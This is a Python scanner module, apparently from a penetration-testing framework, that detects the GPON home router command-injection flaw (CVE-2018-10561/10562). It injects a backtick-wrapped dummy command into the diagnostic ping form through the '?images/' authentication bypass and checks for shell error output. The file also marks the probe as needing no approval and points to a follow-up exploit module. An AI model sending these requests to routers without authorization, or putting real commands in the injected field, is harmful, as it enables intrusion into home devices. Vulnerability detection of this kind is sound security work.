#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GPON Home Router diagnostic form command injection (CVE-2018-10561/10562)."""

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GPON Home Router - Diag Form RCE Detection (CVE-2018-10561)',
        'description': (
            'Detects CVE-2018-10561/10562 by injecting a non-existent command via diag ping '
            'and checking diag.html for shell error or BusyBox overwrite.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2018', 'gpon', 'router', 'iot', 'rce', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/gpon_cve_2018_10561_rce'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2018-10561',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-10562',
        ],
        'cve': 'CVE-2018-10561',
    }

    def run(self):
        non_cmd = self.random_text(12)
        data = (
            f'XWebPageName=diag&diag_action=ping&wan_conlist=0'
            f'&dest_host=`{non_cmd}`;{non_cmd}&ipv=0'
        )
        for path in ('/GponForm/diag_Form?images/', '/menu.html?images/'):
            self.http_request(
                method='POST', path=path, data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
        time.sleep(3)
        r = self.http_request(method='GET', path='/diag.html?images/', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        if (
            f'sh: {non_cmd}: not found' in body
            or 'diag_result = "BusyBox v' in body
            or 'var diag_host = "`' in body
        ):
            self.set_info(
                severity='critical',
                reason='GPON diag Form RCE (CVE-2018-10561/10562)',
                path='/diag.html?images/',
            )
            return True
        return False
